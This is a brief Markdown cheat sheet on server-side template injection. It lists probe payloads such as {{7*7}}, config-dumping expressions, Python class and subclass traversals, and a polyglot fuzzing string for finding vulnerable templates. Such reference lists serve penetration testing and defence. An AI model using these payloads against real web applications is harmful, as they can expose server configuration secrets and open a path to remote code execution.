# SSTI - Server Side Template Injection

![image](https://github.com/zer00d4y/cheatsheets/assets/128820441/c2588b94-23b3-427f-8117-73e98f478881)


`{{7*7}}`

`{{7*'7'}}`

`{{'7'*7}}`

`{{config.items()}}`

`{{config.from_object(‘os’)}}`

`{{‘’.__class__.__mro__[1].__subclasses__()[284:]}}`

`a{*comment*}b`

`${"z".join("ab")}`

`{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}`

`{{''.class.mro()[1].subclasses()}}`

`{{[].class.base.subclasses()}} `

---------------------------------------------------------------------------------------------------------------------

To identify SSTI vulnerabilities, use a Polyglot payload composed of special characters commonly used in template expressions to fuzz the template.
Polyglot: 
- `${{<%[%'"}}%\.`
